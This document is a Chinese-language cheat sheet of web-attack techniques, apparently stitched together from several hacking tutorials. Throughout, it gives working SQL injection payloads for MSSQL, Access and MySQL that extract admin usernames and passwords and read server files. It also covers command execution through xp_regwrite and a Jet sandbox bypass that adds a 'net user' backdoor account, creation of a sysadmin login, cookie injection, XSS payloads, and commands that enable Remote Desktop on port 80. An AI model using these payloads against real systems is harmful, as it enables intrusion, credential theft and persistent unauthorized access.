+;exec xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run'　　以多个记录集方式返回所有键值 
+(2)xp_regread 根键,子键,键值名 
+;exec xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','CommonFilesDir'　返回制定键的值 
+(3)xp_regwrite 根键,子键, 值名, 值类型, 值 
+值类型有2种REG_SZ 表示字符型,REG_DWORD 表示整型 
+;exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName','reg_sz','hello'　写入注册表 
+(4)xp_regdeletevalue 根键,子键,值名 
+exec xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName'　 删除某个值 
+xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Testkey'　 删除键,包括该键下所有值
+96、磁盘目录读取代码
+(1) ;drop table [jm_tmp];create table [jm_tmp](subdirectory nvarchar(400) NULL,depth tinyint NULL,[file] bit NULL)-- 创建表
+(2) ;delete [jm_tmp];Insert [jm_tmp] exec master..xp_dirtree 'C:\',1,1-- 将C盘的文件夹及文件插入到表中
+(3) and 1=(select top 1 cast([subdirectory] as nvarchar(400))+char(124)+cast([file] as nvarchar(1))+char(124) From(Select Top 1 [subdirectory],[file] From [jm_tmp] orDER BY [file],[subdirectory]) T orDER BY [file] desc,[subdirectory] desc) '//暴出第一个文件夹名称
+(4) and 1=(select top 1 cast([subdirectory] as nvarchar(400))+char(124)+cast([file] as nvarchar(1))+char(124) From(Select Top 2 [subdirectory],[file] From [jm_tmp] orDER BY [file],[subdirectory]) T orDER BY [file] desc,[subdirectory] desc) '//暴出第二个文件夹名称
+(5) and 1=(select top 1 cast([subdirectory] as nvarchar(400))+char(124)+cast([file] as nvarchar(1))+char(124) From(Select Top X [subdirectory],[file] From [jm_tmp] orDER BY [file],[subdirectory]) T orDER BY [file] desc,[subdirectory] desc) '//暴出第X个文件夹或文件名称
+(6);drop table [jm_tmp]--删除此表
+97、暴指定记录的字段：
+暴第一条记录字段
+and (select top 1 列名 from 表名)>0
+暴指字记录字段(第二条记录）
+and (select 列名 from (select top 1 * from (select top 2 * from 表名 order by 1) T order by 1 desc)S)>0
+and (select 列名 from (select top 1 * from (select top x * from 表名 order by 1) T order by 1 desc)S)>0 注：X为指定的第X条记录
+98、sa Injection中利用Access执行命令
+(1);exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','Software\Microsoft\Jet\4.0\Engine\SandBoxMode',REG_DWORD,0--
+(2);select * from openRowset('Microsoft.Jet.OLEDB.4.0',';Database=c:\winnt\system32\ias\ias.mdb','select shell("net user kev 1986 /add")');--
+注：还可以用工具soshell.exe
+99、access注入点执行命令
+http://127.0.0.1/a.asp?id=1 and 0<>(select shell("cmd.exe /c net user >c:\c:\inetpub\wwwroot/kev.txt))%00
+
+
+
+
+手工MSSQL注入常用SQL语句
+ 
+
+and exists (select * from sysobjects) //判断是否是MSSQL
+
+and exists(select * from tableName) //判断某表是否存在..tableName为表名
+
+and 1=(select @@VERSION) //MSSQL版本
+
+And 1=(select db_name()) //当前数据库名
+
+and 1=(select @@servername) //本地服务名
+
+and 1=(select IS_SRVROLEMEMBER('sysadmin')) //判断是否是系统管理员
+
+and 1=(Select IS_MEMBER('db_owner')) //判断是否是库权限
+
+and 1= (Select HAS_DBACCESS('master')) //判断是否有库读取权限
+
+and 1=(select name from master.dbo.sysdatabases where dbid=1) //暴库名DBID为1，2，3....
+
+;declare @d int //是否支持多行
+
+and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell') //判断XP_CMDSHELL是否存在
+
+and 1=(select count(*) FROM master.dbo.sysobjects where name= 'xp_regread') //查看XP_regread扩展存储过程是不是已经被删除
+
+添加和删除一个SA权限的用户test：（需要SA权限）
+exec master.dbo.sp_addlogin test,password
+exec master.dbo.sp_addsrvrolemember test,sysadmin
+
+停掉或激活某个服务。 （需要SA权限）
+exec master..xp_servicecontrol 'stop','schedule'
+exec master..xp_servicecontrol 'start','schedule'
+
+暴网站目录
+create table labeng(lala nvarchar(255), id int)
+
+DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots','/',@result output insert into labeng(lala) values(@result);
+
+and 1=(select top 1 lala from labeng) 或者and 1=(select count(*) from labeng where lala>1)
+—————————————————————————————————————————————————————分割
+
+DOS下开3389 并修改端口号
+sc config termservice start= auto
+
+net start termservice
+
+//允许外连
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f 
+
+//该3389端口到80
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 80 /f 
+查3389端口：
+REG query HKLMSYSTEMCurrentControlSetControlTerminal" "ServerWinStationsRDP-Tcp /v PortNumber
+
+我常用的MSSQL注入语句分类：技术文章 - 命令语法, 作者: Unknow , 浏览次数:165
+
+我常用的MSSQL注入语句_显错模式(亦适用于mssql2005)_By Tr4c3[at]126[dot]CoM
+建议:能不用<>尽量不用，能不用单引号尽量不用。
+1.爆表
+
+http://www.tr4c3.com/shownews.asp?id=37 and 1=(select top 1 quotename(name) from sysobjects where xtype=CHAR(85) and name not in (select top N name from sysobjects where xtype=CHAR(85)))--
+
+=>假设爆出表fidpwd(从零开始不停的换not in里面的N的值)
+2.爆字段
+
+http://www.tr4c3.com/shownews.asp?id=37 and 1=(select quotename(col_name(object_id(0x660069006400700077006400),N)))--
+
+如果过滤了单引号就把表名转换成SQL_En，这里0x660069006400700077006400 = fidpwd
+=>假设爆出字段email(从1开始变化N的值)
+3.爆字段值
+
+http://www.tr4c3.com/shownews.asp?id=37 and 1=(select top 1 quotename(email) from fidpwd where email not in (select top N email from fidpwd))--
+
+=>假设爆出字段值kapha@ema.net(从零开始不停的换not in里面的N的值)
+过滤了空格可以考虑/**/,+,%09等替换
+
+
+
+
+
+
+自己在学习过程中总结的一些东西，在这发出来，希望对看到的人能有所帮助吧！
+　　猜解表名：
+and exists (select * from 表名)
+
+　　猜解列名：
+and exists (select 字段 from 表名)
+　　UNION法：
+　　联合查询：
+select name,password,id from user union select user,pwd,uid from
+　　爆指定表名内容：
+and 1=1 union select 1,2,3,4,5 from 表名
+　　ASCII逐字解码法：
+　　1、猜解列长度 
+　　猜解语句：
+and (select top 1 len(列名)from 表名)>N and (select top 1 len(列名)from 表名)=N
+　　其中N是数字，变换这个N的值猜解列长度，例如： 
+and (select top 1 len(列名)from 表名)>1 and (select top 1 len(列名)from 表名)>6
+
+　　如果一直猜到6都显示正常页面，猜到7的时候返回错误（大于6并且小于等于7），那么该列的长度为7。因为“top 1”的意思是把最靠前的1条记录给提取出来，所以如果要猜解第二条记录就该使用：
+　　select top 1 len(列名) from 表名
+　　where 列名 not in (select top 1 列名 from 表名)
+ 
+　　2、ASCII码分析法猜解用户和密码
+ASCII码逐字解码法:基本的思路是先猜出字段的长度，然后依次猜出每一位的值
+and (select top 1 len(username) from admin)=X(X=1,2，3,4，5，… n，假设：username为用户名字段的名称，admin为表的名称 若x为某一值i且abc.asp运行正常时，则i就是第一个用户名的长度。
+and (select top 1 ascii(substring(username,m,1)) from admin)=n (m的值在上一步得到的用户名长度之间，当m=1，2,3，…时猜测分别猜测第1,2,3,…位的值；n的值是1~9、a~z、A~Z的ASCII值，也就是1~128之间的任意值；admin为系统用户帐号表的名称)，
+(1)猜字段的ascii值（access)
+and (select top 1 asc(mid(字段名,1,1)) from 数据库名)>0
+    (2)猜字段的ascii值（mssql)
+and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)>0
+
+　　ASC()函数和Mid函数
+　　例如：mid(列名,N,1)
+　　ASC(mdi(列名,N,1))得到“列名”第N位字符ASCII码 
+　　猜解语句为：
+　　and (select top 1 asc(mid(字段,1,1)) from 数据库名)=ASC码(通过转换工具换)
+　　区间判断语句：
+　　“......between......and......”
+　　中文处理法:
+　　当ASCII转换后为“负数”使用abs()函数取绝对值。
+　　例：and (select top 1 abs(asc(mid(字段,1,1))) from 数据库名)=ASC码(通过转换工具换)
+　　ASCII逐字解码法的应用：
+　　1、猜解表名：
+and (select count(*) from admin)<>0
+
+　　2、猜解列名：
+and (select count(列名) from 表名)<>0
+
+　　3、猜解管理员用户个数：
+and (select count(*) from 表名)=1
+用到的语句：
+and (select count(*) from 猜到的表名)>X （X是个数字）。在注入点后加上这句话，并不停地变换X这个数字，直到猜到准确的记录数为止！比如http://www.xxxxxxxx.com /article/as.asp?id=875 and (select count(*) from admin)>2 ，这个句子是猜admin表里有几条记录的，也就是有几个管理员（因 为一个管理员对应一条记录嘛！）。如果返回正常，说明admin这张表里的记录数大于2。这个时候我们把2改成别的大一点的数！比如5，如果返回错误，说 明管理员的个数在2和5之间，2和5之间的整数是3和4，这个时候我们变换语句为
+　　返回正常，表中有一条记录。
+　　4、猜解管理员用户名的长度：
+and (select len(列名) from 表名)>=1、>=2、>=3、>=4。
+冬%' and (select top 1 len(username) from admin)=3-- and '%'='
+
+　　5、猜解管理员用户名：
+and (select count(*)from 表名 where (asc(mid(列名,1,1))) between 30 and 130)<>0
+或：and (select top 1 asc(mid(username,1,1))from admin)>50
+　　最后提交：
+　　and (select asc(mid(列名,1,1)) from 表名)=ascii的值
+　　6、猜解管理员的密码：
+　　按照上面的原理，只要把上面的语句中(asc(mid(列名,1,1)的列名换成PASSWORD就能得到管理员的密码了。
+'
+　
+搜索型注入漏洞利用猜解语句：
+关键字%' and 1=1 and '%'='% 关键字%' and 1=2 and '%'='%
+
+　　将and 1=1 换成注入语句就可以了。
+　　cookie注入语句:
+　　javascrīpt:alert(document.cookie="id="+escape("44 and 1=1"));
+　　javascrīpt:alert(document.cookie="id="+escape("44 and 1=2"));
+ 
+
+　　猜解语句:
+　　猜解长度:
+javascrīpt:alert(document.cookie="id="+escape("44 and (select len(password) from admin)=16"))
+
+　　猜解内容:
+javascrīpt:alert(document.cookie="id="+escape("44 and (select asc(mid(username)) from admin)=97")) 
+
+
+
+第一步先把IE菜单=>工具=>Internet选项=>高级=>显示友好 HTTP 错误信息前面的勾去掉。否则，不论服务器返回什么错误，IE都只显示为HTTP 500服务器错误，不能获得更多的提示信息。 
+数字型：and 1=1 and 1=2 判断是否存在注入
+字符型：' and '1'='1 ' and '1'='2
+搜索型： 关键字%' and 1=1 and '%'='% 关键字%' and 1=2 and '%'='%
+IIS报错情况下使用： 
+and user>0 （判断是ACCESS还是MSSQL）
+不报错则使用各自数据库特性来判断
+and (select count(*) from msysobjects)>0 （返回权限不足access数据库）
+and (select count(*) from sysobjects)>0 （返回正常则为MSSQL数据库）
+and db_name（）>0 (返回数据库名)
+and 0<>(select @@version)-- (判断版本信息)
+and db_name（）>0 （返回数据库名）
+************注意：猜解之前先要找到后台地址，不然白忙了**********
+ACCESS注入：
+猜解表名（正常则存在admin,不正常则不存在）
+and exists (select * from [admin])
+and (Select Count(*) from Admin)>0
+猜解字段:（字段username存在则正常，不正常则不存在）
+and (Select username from Admin)>0
+and exists (select username from [admin])
+猜解用户名和密码长度
+and (select top 1 len(username) from Admin)>0 
+and (select top 1 len(password) from Admin)>0
+原理：如果top 1的username长度大于0，则条件成立；接着就是>1、>2、>3这样测试下去，一直到条件不成立为止，比如>4成立，>5不成立，就是len(username)=5,即用户名长度为5.得到username的长度后，用mid(username,N,1)截取第N位字符，再asc(mid(username,N,1))得到ASCII码. 
+猜解用户
+and (select top 1 asc(mid(username,1,1)) from Admin)>0，1，2…,
+当输入到109时，显示错误，而108之前显示正确，说明第一个字符的ASCII码为109.，得到第一个字符是m。
+同理and (select top 1 asc(mid(username,2，1) from Admin)>0，1，2…
+到114的时候不成立，说明第二个字符的ASCII码值为114，字符为r。
+注意的是英文和数字的ASCII码在1-128之间...
+MSSQL注入：
+having 1=1-- 【爆出一个表名及字段，如：列 'users.ID' 在选择列表中无效】
+group by users.ID having 1=1-- 
+group by users.ID, users.username, users.password, users.privs having 1=1--
+; insert into users values( 666, attacker, foobar, 0xffff )-- 【插入新记录】
+猜解表名：
+SQL SERVER的每一个数据库都会有用户表和系统表，在系统表sysobjects中， 数据库内创建的每个对象（约束、默认值、日志、规则、存储过程等）在sysobjects表中占一行，那么也就是说当前数据库的表名都会在该表内有存在。我们常用到的参数有三个，name （数据表的名字），xtype（ 数据表的类型 u为用户表），id（ 数据表的对象标志）。
+and (select top 1 name from sysobjects where xtype='u')>0 (得到第一个表名:比如user)
+and (select top 1 name from sysobjects where xtype='u' and name not in ('user'))>0 得到第二个表名，后面的以此类推。。
+猜解列名：
+用到系统自带的2个函数col_name()和object_id()，col_name()的格式是“COL_NAME( table_id , column_id )”，参数table_id是表的标识号，column_id是列的标识号，object_id(admin)就是得到admin在sysobjects中的标识号，column_id=1,2,3表明admin的第1，2，3列。
+and (select top 1 col_name(object_id('admin'),1) from sysobjects)>0 【得到admin字段的第一个列名“username”依次类推，得到“password”“id”等等】
+猜解字段内容：
+and (select top 1 username from [admin])>0 【直接得到用户名】
+and (select top 1 password from [admin])>0 【直接得到密码】
+UNION联合查询：
+select name,password,id from user union select user,pwd,uid from 表名
+and 1=1 union select 1,2,3,4,5... from 表名 (数值从1开始慢慢加，如果加到5返回正常，那就存在5个字段)
+ASCII逐字解码法：
+1、猜解列长度
+and (select top 1 len(列名)from 表名)>N
+其中N是数字，变换这个N的值猜解列长度，当N为6正确，为7错误，则长度为7
+猜解第二条记录就该使用：select top 1 len(列名) from 表名 where 列名 not in (select top 1 列名 from 表名)
+2、猜解用户和密码
+ASC()函数和Mid函数,ASC(mid(列名,N,1))得到“列名”第N位字符ASCII码
+猜解语句为：and (select top 1 asc(mid(字段,1,1)) from 数据库名)>ASCII码
+区间判断语句：....between......and......
+中文处理法:当ASCII转换后为“负数”使用abs()函数取绝对值。
+例：and (select top 1 abs(asc(mid(字段,1,1))) from 数据库名)=ASC码
+ASCII逐字解码法的应用：
+1、猜解表名：and (select count(*) from admin)<>0
+2、猜解列名：and (select count(列名) from 表名)<>0
+3、猜解用户个数：and (select count(*) from 表名)>1,2.. 2正常，3错误，表中有3条记录。
+4、猜解用户名的长度：and (select len(列名) from 表名)>=1、>=2、>=3、>=4。
+5、猜解用户名：and (select count(*)from 表名 where (asc(mid(列名,1,1))) between 30 and 130)<>0
+最后提交：and (select asc(mid(列名,1,1)) from 表名)=ascii的值
+6、猜解管理员的密码：
+按照上面的原理，把上面的语句中(asc(mid(列名,1,1)的列名换成PASSWORD就能得到密码了。
+MYSQL+PHP注入：
+1.判断是否存在注入,加';and 1=1 ;and 1=2 
+2.判断版本 and ord(mid(version(),1,1))>51 /* 返回正常说明是4.0以上版本，可以用union查询
+3.利用order by 暴字段，在网址后加 order by 10 /* 如果返回正常说明字段大于10
+4.再利用union来查询准确字段，如: and 1=2 union select 1,2,3,......./*直到返回正常，说明猜到准确字段数。如过滤了空格可以用/**/代替。
+5.判断数据库连接帐号有没有写权限，and (select count(*) from mysql.user)>0 /*如果结果返回错误，那我们只能猜解管理员帐号和密码了。
+6.如果返回正常，则可以通过and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 /* 注：load_file(char(文件路径的ascii值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件，找到数据库连接等。
+7.首先猜解user表,如: and 1=2 union select 1,2,3,4,5,6.... from user /* 如果返回正常，说明存在这个表。
+8.知道了表就猜解字段,and 1=2 union select 1,username,3,4,5,6.... from user/*如果在2字段显示出字段内容则存在些字段。
+9.同理再猜解password字段。
+cookie注入:
+条件:ID=Request("ID")，（WEB服务器是先去取GET中的数据，没有的话再取POST中的数据,还没有再去取Cookies中的数据）；未对cookie进行过滤，那么就造成了cookie注入。
+*****用 Request.QueryString或Request.Form收集数据的话，是无法利用Cookies注入的******
+判断是否存在cookie注入
+例如：http://www.xxx.com/1.asp?id=44
+输入 http://www.xxx.com/1.asp 显示不正常，因为没有输参数。
+javascript:alert(document.cookie="id="+escape("44 and 1=1"));刷新页面,显示正常,可以再试下一步(如果不正常,就有可能也有过滤了)
+javascript:alert(document.cookie="id="+escape("44 and 1=2"));刷新一下页面，如果不正常显示，这就表示有注入了。
+猜解长度:
+javascript:alert(document.cookie="id="+escape("44 and (select len(password) from admin)=16"))
+猜解内容:
+javascript:alert(document.cookie="id="+escape("44 and (select asc(mid(username)) from admin)=97"))
+PHP注入：
+判断注入点：';and 1=1 ';and 1=2
+判断UNION：and ord(mid(version(),1,1))>51 返回正确则4.0可用UNION查询
+利用order by 暴字段：order by n (n=1,2,3.. ) （当n为3正确，4错误是，则3个字段）
+利用union来查询准确字段：and 1=1 union select 1,2,3,....... （当返回正常时，就说明猜到准确字段数=最后一个数）
+判断数据库连接帐号有没有写权限：and (select count(*) from mysql.user)>0（如果返回错误，我们就猜管理员的帐号密码，如果返回正常，则可以通过
+and 1=2 union select 1,2,3,4,5,6, load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 [注意：load_file(char(文件路径的ascii值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件]）
+猜解表：and 1=2 union select 1,2,3,4,5,6.... from user （回正常，说明存在这个表）
+猜字段：and 1=2 union select 1,username,3,4,5,6.... from user （同样道理，自己替换，如果在2字段显示出字段内容则存在些字段）
+同理再猜解password字段.
+跨站
+<script>alert("跨站")</script> (最常用）
+<img scr=javascript:alert("跨站")></img>
+<img scr="javascript: alert(/跨站/)></img>
+<img scr="javas????cript:alert(/跨站/)" width=150></img> (?用tab键弄出来的空格）
+<img scr="#" onerror=alert(/跨站/)></img>
+<img scr="#" style="xss:expression(alert(/xss/));"></img>
+<img scr="#"/* */onerror=alert(/xss/) width=150></img> (/**/ 表示注释）
+<img src=vbscript:msgbox ("xss")></img>
+<style> input {left:expression (alert('xss'))}</style>
+<div style={left:expression (alert('xss'))}></div>
+<div style={left:exp/* */ression (alert('xss'))}></div>
+<div style={left:\0065\0078ression (alert('xss'))}></div>
+html 实体 <div style={left:&#ｘ0065；xpression (alert('xss'))}></div>
+unicode <div style="{left:expRessioN (alert('xss'))}">[/post] 
+
